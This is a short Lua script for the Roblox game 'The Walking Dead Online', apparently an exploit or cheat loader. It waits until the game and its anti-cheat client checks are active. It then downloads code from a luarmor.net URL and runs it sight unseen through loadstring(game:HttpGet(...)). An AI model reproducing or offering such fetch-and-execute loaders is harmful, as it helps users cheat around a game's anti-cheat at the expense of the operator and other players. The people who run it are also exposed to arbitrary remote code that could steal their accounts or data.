--// The Walking Dead Online
repeat task.wait() until game:IsLoaded() and game:GetService("Players").LocalPlayer and game:GetService("Players"):GetAttribute("Loaded") and workspace:GetAttribute("AntiCheatClientChecksActive");

loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/1a7468ce4abe9e36d955e0b1f91bf895.lua"))()
